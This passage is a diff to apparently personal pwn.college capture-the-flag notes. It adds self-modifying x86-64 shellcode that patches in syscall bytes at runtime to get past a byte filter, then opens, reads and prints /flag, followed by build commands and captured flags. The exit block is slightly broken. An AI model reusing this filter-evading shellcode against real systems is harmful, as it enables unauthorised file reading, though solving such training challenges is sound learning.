@@ -365,7 +365,70 @@ gcc -nostdlib -o solve.elf shell5.s
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level5
+
 pwn.college{AtdbB36V5Z-bC81puuNGpZg0QuS.QXxIjMscTOxUzW}
+
+# 6
+.global _start
+.intel_syntax noprefix
+_start:
+    .rept 4096
+    nop
+    .endr
+    #fix up our syscalls
+    mov byte ptr [rip+syscall1], 0x0f
+    mov byte ptr [rip+syscall1+1], 0x05
+    mov byte ptr [rip+syscall2], 0x0f
+    mov byte ptr [rip+syscall2+1], 0x05
+    mov byte ptr [rip+syscall3], 0x0f
+    mov byte ptr [rip+syscall3+1], 0x05
+
+    # open files
+    mov rsi, 0
+    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rax, 2              #syscall 2 opens file
+syscall1:
+    .byte 0x13
+    .byte 0x37
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+syscall2:
+    .byte 0x13
+    .byte 0x37
+
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+syscall3:
+    .byte 0x13
+    .byte 0x37
+
+    #exit
+    mov rax, 60
+    mov rax, 42
+syscall4:
+    .byte 0x13
+    .byte 0x37
+
+#\0 is null terminating for strings
+flag:
+    .ascii "/flag\0"
+
+
+gcc -nostdlib -o solve.elf shell6.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level6
+
+pwn.college{U9daynYJnepLdAJU-nWLYoGWVgR.QXyIjMscTOxUzW}
+
 
 # 8
 
